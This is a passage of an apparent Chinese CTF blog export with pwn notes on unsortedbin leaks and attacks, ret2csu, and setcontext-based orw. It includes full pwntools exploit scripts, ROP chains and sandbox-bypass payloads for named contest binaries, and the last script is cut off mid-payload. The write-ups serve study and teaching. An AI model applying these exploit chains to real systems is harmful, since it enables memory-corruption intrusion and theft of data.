(!heap[idx]) \t&#123;    puts(&quot;nothing here\\n&quot;);\t&#125; \telse \t&#123;    puts(&quot;input your size:&quot;);    size = getnum();    puts(&quot;content:&quot;);    read(0,heap[idx],size);    puts(&quot;success!&quot;);\t&#125;&#125;void menu(void)&#123;    puts(&quot;1.create&quot;);    puts(&quot;2.delete&quot;);    puts(&quot;3.edit&quot;);    puts(&quot;4.show&quot;);    puts(&quot;your choice:&quot;);&#125;int main()&#123;  int choice;  while ( 1 ) &#123;     while(1)    &#123;           setbuf(stdin, 0);\t\tsetbuf(stdout, 0);        menu();        scanf(&quot;%d&quot;,&amp;choice);        if ( choice == 1 )\t\t&#123;\t\t  create();\t\t&#125;\t\t\t\telse if ( choice == 3 )\t\t&#123;\t\t  edit();\t\t&#125;\t\telse if ( choice == 4 )\t\t&#123;\t\t  show();\t\t&#125;\t\telse if ( choice ==2  )\t\t&#123;\t\t  dele();\t\t&#125;\t\telse\t\t&#123;\t\t  puts(&quot;Invalid choice&quot;);\t\t  exit(0);\t\t&#125;\t&#125; &#125;&#125; \n\ndebug_exp:\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./testheap&#x27;)elf = ELF(&#x27;./testheap&#x27;)#libc = ELF(&#x27;./libc-2.23.so&#x27;)def create(size):\tp.sendlineafter(b&#x27;choice:\\n&#x27;, b&#x27;1&#x27;)\tp.sendlineafter(b&#x27;size:\\n&#x27;, str(size))def dele(idx):\tp.sendlineafter(b&#x27;choice:\\n&#x27;, b&#x27;2&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))def edit(idx, size, content):\tp.sendlineafter(b&#x27;choice: \\n&#x27;, b&#x27;3&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))\tp.sendlineafter(b&#x27;size:\\n&#x27;, str(size))\tp.sendlineafter(b&#x27;content:\\n&#x27;, str(content))def show(idx):\tp.sendlineafter(b&#x27;choice:\\n&#x27;, b&#x27;4&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))debug()create(0x90)create(0x20)for i in  range(3,11):    create(0x90)for i in range(3,11):    dele(i)dele(0)  #该chunk进入unsortedbinpause()create(0x45)pause()show(11)\nfree掉7个chunk以绕过tcachebin\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x9cb000Size: 0x251Free chunk (unsortedbin) | PREV_INUSEAddr: 0x9cb250Size: 0xa1fd: 0x7ff473e90ca0bk: 0x7ff473e90ca0Allocated chunkAddr: 0x9cb2f0Size: 0x30Allocated chunk | PREV_INUSEAddr: 0x9cb320Size: 0xa1Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb3c0Size: 0xa1fd: 0x00Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb460Size: 0xa1fd: 0x9cb3d0Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb500Size: 0xa1fd: 0x9cb470Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb5a0Size: 0xa1fd: 0x9cb510Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb640Size: 0xa1fd: 0x9cb5b0Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb6e0Size: 0xa1fd: 0x9cb650Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb780Size: 0xa1fd: 0x9cb6f0Top chunk | PREV_INUSEAddr: 0x9cb820Size: 0x207e1\n如果unsortedbin的链表中只有其一个堆块 那么他的fd域和bk域都将指向main_arena+96（main_arena+x,x与glibc版本唯一相关且确定）\npwndbg&gt; bintcachebins0xa0 [  7]: 0x9cb790 —▸ 0x9cb6f0 —▸ 0x9cb650 —▸ 0x9cb5b0 —▸ 0x9cb510 —▸ 0x9cb470 —▸ 0x9cb3d0 ◂— 0x0fastbinsemptyunsortedbinall: 0x9cb250 —▸ 0x7ff473e90ca0 (main_arena+96) ◂— 0x9cb250smallbinsemptylargebinsempty\nunsortedbin内此时的结构\npwndbg&gt; x/40gx 0x9cb2500x9cb250:\t0x0000000000000000#prev_size#\t0x00000000000000a1#size0x9cb260:\t0x00007ff473e90ca0#fd#\t0x00007ff473e90ca0#bk0x9cb270:\t0x0000000000000000\t0x00000000000000000x9cb280:\t0x0000000000000000\t0x00000000000000000x9cb290:\t0x0000000000000000\t0x00000000000000000x9cb2a0:\t0x0000000000000000\t0x00000000000000000x9cb2b0:\t0x0000000000000000\t0x00000000000000000x9cb2c0:\t0x0000000000000000\t0x00000000000000000x9cb2d0:\t0x0000000000000000\t0x00000000000000000x9cb2e0:\t0x0000000000000000\t0x00000000000000000x9cb2f0:\t0x00000000000000a0\t0x00000000000000300x9cb300:\t0x0000000000000000\t0x00000000000000000x9cb310:\t0x0000000000000000\t0x00000000000000000x9cb320:\t0x0000000000000000\t0x00000000000000a10x9cb330:\t0x0000000000000000\t0x00000000000000000x9cb340:\t0x0000000000000000\t0x00000000000000000x9cb350:\t0x0000000000000000\t0x00000000000000000x9cb360:\t0x0000000000000000\t0x00000000000000000x9cb370:\t0x0000000000000000\t0x00000000000000000x9cb380:\t0x0000000000000000\t0x0000000000000000\n\nFree chunk (unsortedbin) | PREV_INUSEAddr: 0x1bd6250Size: 0xa1fd: 0x7fe2527beca0bk: 0x7fe2527beca0\ncreate一个0x45的chunk后\nAllocated chunk | PREV_INUSEAddr: 0x9cb250Size: 0x51Free chunk (unsortedbin) | PREV_INUSEAddr: 0x9cb2a0Size: 0x51fd: 0x7ff473e90ca0bk: 0x7ff473e90ca0\n可见当用户申请新的空间时，系统会优先分割unsortedbin中的空间（申请的空间小于等于unsortedbin的空间）\n此时新chunk内的结构\npwndbg&gt; x/40gx 0x9cb2500x9cb250:\t0x0000000000000000\t0x00000000000000510x9cb260:\t0x00007ff473e90d30\t0x00007ff473e90d300x9cb270:\t0x0000000000000000\t0x00000000000000000x9cb280:\t0x0000000000000000\t0x00000000000000000x9cb290:\t0x0000000000000000\t0x00000000000000000x9cb2a0:\t0x0000000000000000\t0x00000000000000510x9cb2b0:\t*0x00007ff473e90ca0\t*0x00007ff473e90ca00x9cb2c0:\t0x0000000000000000\t0x00000000000000000x9cb2d0:\t0x0000000000000000\t0x00000000000000000x9cb2e0:\t0x0000000000000000\t0x00000000000000000x9cb2f0:\t0x0000000000000050\t0x00000000000000300x9cb300:\t0x0000000000000000\t0x00000000000000000x9cb310:\t0x0000000000000000\t0x00000000000000000x9cb320:\t0x0000000000000000\t0x00000000000000a10x9cb330:\t0x0000000000000000\t0x00000000000000000x9cb340:\t0x0000000000000000\t0x00000000000000000x9cb350:\t0x0000000000000000\t0x00000000000000000x9cb360:\t0x0000000000000000\t0x00000000000000000x9cb370:\t0x0000000000000000\t0x00000000000000000x9cb380:\t0x0000000000000000\t0x0000000000000000\n我们可以看到原来chunk的fd与bk都被保留可以借此泄露libc基址（能打印chunk中数据的情况）\nunsortedbin_attack，part use在malloc.c中的_int_malloc有一段关于Unsorted bin chunk摘除的代码：\n/* remove from unsorted list */if (__glibc_unlikely (bck-&gt;fd != victim))\tmalloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);\n看后两行就好了，unsorted_chunk的bk指针指向的是它后一个被释放的chunk的块地址（bck），后一个被释放的chunk的fd指针指向的是unsorted_chunk的块地址。如果我们能够控制unsorted_chunk的bk，那么就意味着可以将unsorted_chunks (av)，即unsorted_chunk的块地址写到任意可写地址内一段来自how2heap的代码，已经去掉英文解说\n//gcc how2heap.c -g -no-pie -o unsorted_bin#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123;unsigned long target_var = 0;//修改目标fprintf(stderr,&quot;&amp;target_var and target_var:\\n&quot;);fprintf(stderr, &quot;%p: %ld\\n\\n&quot;, &amp;target_var, target_var);unsigned long *p = malloc(400);//chunk0fprintf(stderr, &quot;The first chunk_addr at: %p\\n&quot;,p);malloc(500);//chunk1free(p);//*breakpoint1fprintf(stderr, &quot;The first chunk_fd is %p\\n&quot;,(void *)p[1]);p[1] = (unsigned long)(&amp;target_var - 2);//*breakpoint2fprintf(stderr, &quot;Now,The first chunk_fd is %p\\n\\n&quot;, (void *)p[1]);malloc(400);//chunk2fprintf(stderr, &quot;target has been rewrite %p: %p\\n&quot;, &amp;target_var, (void *)target_var);&#125;\n创建一个名为target_var的无符号长整型变量，并将其初始化为0。使用fprintf函数打印target_var的地址和值。分配一个400字节大小的chunk，并将其地址存储在指针变量p中。使用fprintf函数打印第一个内存块的地址。分配一个500字节大小的chunk（此处没有存储其返回值）。释放之前分配的内存块p。使用fprintf函数打印第一个内存块的第二个元素（p[1]）的值，此时它将显示先前分配的内存块的fd（free chunk中的前向指针）。将第一个内存块的第二个元素（p[1]）修改为target_var的地址减去2（&amp;target_var - 2），即使得其指向target_var之前的位置。使用fprintf函数再次打印第一个内存块的第二个元素（p[1]）的值，此时它将显示修改后的地址。分配一个400字节大小的内存块。使用fprintf函数打印target_var的地址和值，现在target_var已被篡改，其值应该是修改后的地址。\n接下来跟着gdb单步看内存情况由于笔者16.04的环境g了，通过上面绕过tcache机制的方式来看unsortedbin停在breakpoint1\nunsortedbinall: 0x602250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x602250 /* &#x27;P&quot;`&#x27; */Free chunk (unsortedbin) | PREV_INUSEAddr: 0x602250Size: 0x1a1fd: 0x7ffff7dcdca0 bk: 0x7ffff7dcdca0\n可以看到第一个进入unsorted_bin的chunk（chunk0）的fd和bk都指向0x7ffff7dcdca0 (main_arena+96)\n申请chunk1是为了防止chunk0在进入unsorted_bin的时候与top_chunk合并，可以不管\n接下来走到p[1] &#x3D; (unsigned long)(&amp;target_var - 2);这段代码其实修改的是chunk0的bk指针，使其指向了target_var_addr - 0x10这一处地址\n为什么减去的是0x10，因为target_var 是unsigned long类型的，&amp;target_var - 2就意味着要减去两个地址位宽（8 + 8）为什么要减去0x10，这是因为想将target_var所在地址作为一个fake_chunk的malloc地址，即fake_chunk的fd位置，减0x10的位置就是fake_chunk的块指针，这样才符合Unsorted bin双向链表的规则\n接下来走到malloc(400);\nunsortedbinall [corrupted]FD: 0x602250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x602250 /* &#x27;P&quot;`&#x27; */BK: 0x602250 —▸ 0x7fffffffe2a0 —▸ 0x602260 ◂— 0x0\n这里系统把unsorted_bin中的chunk0的空间分配给了chunk2\n在执行 p[1] &#x3D; (unsigned long)(&amp;target_var - 2)修改完chunk0的bk指针后，bk链接的就是以target - 0x10为块头的fake_chunk了。这里需要注意的是，由于chunk0现在还挂在unsorted_bin中，我们此时更改chunk0的bk会导致corrupted\n由于在上一个步骤中发生了corrupted，所以在重新启用chunk0分配到chunk2的时候，unsorted_bin的fd依然还会指向fake_chunk。但chunk0已经被拿走了，此时fake_chunk就与unsorted_bin相邻了，所以fake_chunk作为unsorted_bin的后一个chunk，fake_chunk的fd指针（即target的值）就会执行unsorted_bin的块头。unsorted_bin的bk指针将会指向fake_chunk的块头\n那么这样一来target中的值就从0变为了unsorted_bin的地址了前面的攻击手段，以后再来探索吧~\n","categories":["heap"],"tags":["bin"]},{"title":"ret2csu","url":"/2023/11/10/ret2csu/","content":"最近才见到一题用csu解题的顺便整理一波做栈题经常能看见__libc_csu_init这个函数，能不能加以利用呢\n在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。__libc_csu_init in IDA\n.text:0000000000400900                               ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64).text:0000000000400900                               public __libc_csu_init.text:0000000000400900                               __libc_csu_init proc near               ; DATA XREF: _start+16↑o.text:0000000000400900                               ; __unwind &#123;.text:0000000000400900 41 57                         push    r15.text:0000000000400902 41 56                         push    r14.text:0000000000400904 49 89 D7                      mov     r15, rdx.text:0000000000400907 41 55                         push    r13.text:0000000000400909 41 54                         push    r12.text:000000000040090B 4C 8D 25 7E 04 20 00          lea     r12, __frame_dummy_init_array_entry.text:0000000000400912 55                            push    rbp.text:0000000000400913 48 8D 2D 7E 04 20 00          lea     rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040091A 53                            push    rbx.text:000000000040091B 41 89 FD                      mov     r13d, edi.text:000000000040091E 49 89 F6                      mov     r14, rsi.text:0000000000400921 4C 29 E5                      sub     rbp, r12.text:0000000000400924 48 83 EC 08                   sub     rsp, 8.text:0000000000400928 48 C1 FD 03                   sar     rbp, 3.text:000000000040092C E8 4F FD FF FF                call    _init_proc.text:000000000040092C.text:0000000000400931 48 85 ED                      test    rbp, rbp.text:0000000000400934 74 20                         jz      short loc_400956.text:0000000000400934.text:0000000000400936 31 DB                         xor     ebx, ebx.text:0000000000400938 0F 1F 84 00 00 00 00 00       nop     dword ptr [rax+rax+00000000h].text:0000000000400938.text:0000000000400940.text:0000000000400940                               loc_400940:                             ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400940 4C 89 FA                      mov     rdx, r15.text:0000000000400943 4C 89 F6                      mov     rsi, r14.text:0000000000400946 44 89 EF                      mov     edi, r13d.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8].text:0000000000400949.text:000000000040094D 48 83 C3 01                   add     rbx, 1.text:0000000000400951 48 39 DD                      cmp     rbp, rbx.text:0000000000400954 75 EA                         jnz     short loc_400940.text:0000000000400954.text:0000000000400956.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400956 48 83 C4 08                   add     rsp, 8.text:000000000040095A 5B                            pop     rbx.text:000000000040095B 5D                            pop     rbp.text:000000000040095C 41 5C                         pop     r12.text:000000000040095E 41 5D                         pop     r13.text:0000000000400960 41 5E                         pop     r14.text:0000000000400962 41 5F                         pop     r15.text:0000000000400964 C3                            retn.text:0000000000400964                               ; &#125; // starts at 400900.text:0000000000400964.text:0000000000400964                               __libc_csu_init endp\nfirst_csu\n.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400956 48 83 C4 08                   add     rsp, 8.text:000000000040095A 5B                            pop     rbx.text:000000000040095B 5D                            pop     rbp.text:000000000040095C 41 5C                         pop     r12.text:000000000040095E 41 5D                         pop     r13.text:0000000000400960 41 5E                         pop     r14.text:0000000000400962 41 5F                         pop     r15.text:0000000000400964 C3                            retn\nsecond_csu\n.text:0000000000400940                               loc_400940:                             ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400940 4C 89 FA                      mov     rdx, r15.text:0000000000400943 4C 89 F6                      mov     rsi, r14.text:0000000000400946 44 89 EF                      mov     edi, r13d.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8].text:0000000000400949.text:000000000040094D 48 83 C3 01                   add     rbx, 1.text:0000000000400951 48 39 DD                      cmp     rbp, rbx.text:0000000000400954 75 EA                         jnz     short loc_400940\n在first_csu，我们可以靠栈溢出的数据构造来控制rbx,rbp,r12,r13,r14,r15 寄存器的数据在second_csu，r15赋值给rdx，r14赋值给rsi，r13d赋值给edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位）\n在0x40094D我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 &#x3D; rbp，这样我们就不会执行loc_400940，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1\n手搓\ndef ret2csu(rbx,rbp,r12,r13,r14,r15):    payload = &#x27;a&#x27;*(padding)    payload += p64(first_csu)    payload += p64(rbx)+p64(rbp)#一般：rbx = 0 ,rbp = 1    payload += p64(r12) #call.addr    payload += p64(r13) + p64(r14) + p64(r15) #三个参数    payload += p64(second_csu)    payload += &#x27;a&#x27;*( 7 * 8 )    return payload\npwntools集成(stack privoting_version)\nfrom pwn import*context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)r = ROP(binary_file)r.ret2csu(edi=0, rsi=0x601038, rdx=0x200, rbp=0x601038, call=elf.got[&#x27;read&#x27;])payload += r.chain()payload += p64(leave_ret)payload = payload.ljust(0x100, b&#x27;a&#x27;)p.send(payload)\n\n\n[鹏城杯2023 silent]checksec,full relro\n[*] &#x27;/mnt/Desktop/鹏城/silent/silent&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n开了沙盒程序很简单,很多函数都没法复用有csu，能用read\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[64]; // [rsp+10h] [rbp-40h] BYREF  init_seccomp();  alarm(0x1Eu);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  read(0, buf, 0x100uLL);  return 0;&#125;\nret2csu改stdin为read多次call read来泄露libc并写入orw的shellcode看wp是1&#x2F;4096的概率打通\nfrom pwn import *from pwn import p64,u64binary = ELF(&quot;./silent&quot;)def exploit():    #p = process(&quot;./silent&quot;)    p=remote(&#x27;172.10.0.8&#x27;,9999)    #context.log_level = &#x27;debug&#x27;    context.log_level = &#x27;error&#x27;    # pause()    pop_rdi = 0x0000000000400963    pop_rsi_r15 = 0x0000000000400961    mov_rax_got = 0x0000000000400869    leave_ret = 0x0000000000400876      payload  = b&#x27;a&#x27; * 0x48    context.arch = &#x27;amd64&#x27;    r = ROP(binary)    r.ret2csu(edi=0, rsi=0x601038, rdx=0x110, rbp=0x601038, call=binary.got[&#x27;read&#x27;])    payload += r.chain()    payload += p64(leave_ret)    payload = payload.ljust(0x100, b&#x27;a&#x27;)    p.send(payload)    jmp_rbp = 0x0000000000400a93    # : jmp qword ptr [rbp];     payload = b&#x27;a&#x27; * 8    r = ROP(binary)    r.ret2csu(edi=0, rsi=0x601030, rdx=3, rbp=0x601030, call=binary.got[&#x27;read&#x27;])    payload += r.chain()    payload += p64(pop_rdi)    payload += p64(0x600fd8)#[0x600fd8] alarm@GLIBC_2.2.5 -&gt; 0x7ffff7e772c0 (alarm) ◂— mov eax, 0x25    payload += p64(jmp_rbp)    r = ROP(binary)    r.ret2csu(edi=0, rsi=0x601148, rdx=0x100, rbp=0x601030, call=binary.got[&#x27;read&#x27;])    payload += r.chain()    p.send(payload)    # pause()    # sleep(0.5)    p.send(b&#x27;\\x70\\x29\\x84&#x27;)    try:        libc = u64(p.recvline(timeout=1)[:-1].ljust(8, b&#x27;\\x00&#x27;)) - 0xe44f0    except:        p.close()    else:        if libc &lt; 0:            return        success(f&quot;libc: &#123;hex(libc)&#125;&quot;)        pop_rsi = libc + 0x0000000000023a6a        pop_rdx = libc + 0x0000000000001b96        ret = 0x0000000000400696        flag_str = 0x6011e0        # payload = p64(one_gadget)        payload = p64(pop_rdi)        payload += p64(flag_str)        payload += p64(pop_rsi)        payload += p64(0)        payload += p64(libc + 0x10fbf0) # open        payload += p64(pop_rdi)        payload += p64(3)        payload += p64(pop_rsi)        payload += p64(flag_str)        payload += p64(pop_rdx)        payload += p64(0x100)        payload += p64(libc + 0x110020) # read        payload += p64(pop_rdi)        payload += p64(1)        payload += p64(pop_rsi)        payload += p64(flag_str)        payload += p64(pop_rdx)        payload += p64(0x100)        payload += p64(libc + 0x1100f0) # write        payload += b&#x27;./flag&#x27;        # pause()        sleep(1)        p.send(payload)        p.interactive()        p.close()        exit(0)count = 0while True:    print(f&quot;try: &#123;count&#125;&quot;)    count += 1    exploit()p.interactive()\n\n\n[DASCTF11月月赛(2023) A_Sad_story]开了pie直接看主要的漏洞点，这里有个选择选一可以拿到基址选二可以有次溢出（长度几乎无限制）但是走完会有段sandbox直接上exp，记录这波sandbox的绕过\nfrom pwn import *context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;libc = ELF(&#x27;./libc-2.31.so&#x27;)  elf = ELF(&#x27;./challenge&#x27;)      p = process(&quot;./challenge&quot;)#p = remote(&quot;node4.buuoj.cn&quot;, 28133)def elf_base():    p.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)    p.recvuntil(b&#x27;0x&#x27;)    value = int(p.recv(12), 16) - 0x1249    return valueelf.address = elf_base()success(&quot;elf--&gt; %s&quot; + hex(elf.address))csu1 = elf.address + 0x1620csu2 = elf.address + 0x163aoffset = b&#x27;a&#x27; * 0x38# Craft the ROP chainrop_chain = [    csu2, 0, 1, 0, elf.got[&#x27;close&#x27;], 1, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 0, elf.address + 0x4280, 257, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 0, elf.address + 0x4280, 0, elf.got[&#x27;close&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 1, elf.address + 0x4280, 0x30, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 0, elf.address + 0x4280 + 0x30, 1, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 2, elf.address + 0x4280, 0x30, elf.got[&#x27;close&#x27;],    csu1]#大佬的构造，以下我改成我熟悉的样子(def ret2csu(rbx,rbp,r12,r13,r14,r15):    payload = p64(csu2)    payload += p64(rbx)+p64(rbp)#一般：rbx = 0 ,rbp = 1    payload += p64(r12) #call.addr    payload += p64(r13) + p64(r14) + p64(r15) #三个参数    payload += p64(csu1)    payload += p64(0)*7    return payloadrop_chain =ret2csu(0,1,0,elf.got[&#x27;close&#x27;],1,elf.got[&#x27;read&#x27;]) rop_chain +=ret2csu(0, 1, 0, elf.address + 0x4280, 257, elf.got[&#x27;read&#x27;])rop_chain +=ret2csu(0, 1, 0, elf.address + 0x4280, 0, elf.got[&#x27;close&#x27;])rop_chain +=ret2csu(0, 1, 1, elf.address + 0x4280, 0x30, elf.got[&#x27;read&#x27;])rop_chain +=ret2csu(0, 1, 0, elf.address + 0x4280 + 0x30, 1, elf.got[&#x27;read&#x27;])rop_chain +=ret2csu(0, 1, 2, elf.address + 0x4280, 0x30, elf.got[&#x27;close&#x27;])payload2 = rop_chainpayload = b&#x27;&#x27;.join([p64(addr) for addr in rop_chain])p.sendline(b&#x27;2&#x27;)p.sendline(offset + payload)p.send(b&#x27;\\x15&#x27;)p.send(b&#x27;/flag&#x27; + b&#x27;\\x00&#x27; * (257 - 5))p.send(b&#x27;\\x00&#x27; * 1)p.interactive()","categories":["stack"],"tags":["rop"]},{"title":"setcontext","url":"/2023/09/28/setcontext/","content":"基于堆的orw由于沙箱机制的存在，不能使用onegadget或者system。此时我们就需要使用ROP链的方式构造orw。接下来问题就来了，虽然可以构造ROP链，但是怎么调用呢，ROP链需要设置栈上的参数，仅仅靠free_hook或者malloc_hook等钩子函数是无法利用的，因此也就有了setcontext。\n&lt;setcontext&gt;:     push   rdi&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]&lt;setcontext+8&gt;:   xor    edx,edx&lt;setcontext+10&gt;:  mov    edi,0x2&lt;setcontext+15&gt;:  mov    r10d,0x8&lt;setcontext+21&gt;:  mov    eax,0xe&lt;setcontext+26&gt;:  syscall &lt;setcontext+28&gt;:  pop    rdi&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]&lt;setcontext+44&gt;:  fldenv [rcx]&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]&lt;setcontext+94&gt;:  push   rcx&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]&lt;setcontext+125&gt;: xor    eax,eax&lt;setcontext+127&gt;: ret    &lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x356951]        &lt;setcontext+135&gt;: neg    eax&lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax&lt;setcontext+140&gt;: or     rax,0xffffffffffffffff&lt;setcontext+144&gt;: ret\ntips:这里讲讲为什么不直接用而要用&lt;setcontext+53&gt;原因是执行到&lt;setcontext+44&gt;:  fldenv [rcx] 的时候程序会直接crash\n一般利用方式我们会将free_hook或者malloc_hook地址的内容覆盖为setcontext+53，最后再malloc或者free一下。这里程序流程可以解释如下：执行free或者malloc后跳转到setcontext+53，然后将rsp指针指向orw链，然后修改rcx的值为ret指令的地址，push rcx，至于其它寄存器的值此处可以不用在意，最后执行setcontext末尾后紧邻的retn，栈头出栈也还是ret指令，然后继续弹出，此时的rsp指向的地址正好是orw链的开头。  setcontext的具体操作也就是这样，这里最后再补充一个点，前面我们为了修改rsp和rcx的值需要找准偏移，一般我们可以手算一下，当然也可以利用pwntools的SigreturnFrame类直接来构造。此时frame中的rsp和rip对应的就是setcontext的rsp和rcx。\nfrom pwn import *context.arch = &quot;amd64&quot;#这个必须要设置，同sropframe = SigreturnFrame()frame.rsp = 0xaaframe.rip = 0xbb\n看道例题吧~[CISCN 2021 初赛]silverwolfchecksec\n[*] &#x27;/home/str1k3/Desktop/silverwolf&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled\n存在沙盒\nroot@ubuntu:/home/str1k3/Desktop# seccomp-tools dump &#x27;/home/str1k3/Desktop/silverwolf&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL\n\nNSS上给的是glibc2.27，据说当时发现是glibc2.29，环境可能不大一样，exp留给自己看\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)#p = process(&quot;./silverwolf&quot;)p = remote(&quot;node4.anna.nssctf.cn&quot;,28768)libc = ELF(&quot;./libc-2.27.so&quot;)def choice(choice):  p.recvuntil(&quot;choice: &quot;)  p.sendline(str(choice))def add(index,size):  choice(1)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))  p.recvuntil(&quot;Size: &quot;)  p.sendline(str(size))  def edit(index,content):  choice(2)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))  p.recvuntil(&quot;Content: &quot;)  p.sendline(content)  def show(index):  choice(3)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))  def free(index):  choice(4)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))def clean():  for i in range(7):    add(0,0x78)  for i in range(12):    add(0,0x18)  for i in range(14):    add(0,0x68)  add(0,0x58)#沙盒会影响堆风水，简单恢复，具体不是很清楚呜呜呜clean()add(0,0x28)free(0)edit(0,p64(0)*2)free(0)add(0,0x28)show(0)p.recvuntil(&quot;Content: &quot;)heap_base = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;)) &amp; 0xFFFFFFFFFFFFF000-0x1000success(&quot;heap:&quot; + hex(heap_base))edit(0,p64(heap_base+0x10))add(0,0x28)add(0,0x28)edit(0,p64(0)*4+p64(0x7000000))free(0)show(0)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebca0free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;] + 53add(0,0x48)edit(0,p64(0)*9)add(0,0x18)edit(0,p64(heap_base+0x50))add(0,0x38)payload = p64(free_hook) #18payload += p64(heap_base + 0x2000) 